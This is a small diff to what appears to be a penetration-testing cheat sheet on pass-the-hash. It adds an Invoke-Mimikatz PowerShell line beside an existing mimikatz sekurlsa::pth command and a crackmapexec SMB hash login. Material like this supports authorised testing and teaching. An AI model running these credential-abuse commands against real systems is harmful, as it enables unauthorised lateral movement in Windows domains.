@@ -48,6 +48,8 @@ crackmapexec smb <IP> -u USER -H <LM:NT>
 {% code overflow="wrap" %}
 ```powershell
 .\mimikatz.exe "sekurlsa::pth /user:$USER /domain:domain.com /ntlm:$NTLM_HASH /run:powershell.exe"
+
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:$USER /domain:domain.com /ntlm:$NTLM_HASH /run:powershell.exe"'
 ```
 {% endcode %}
 
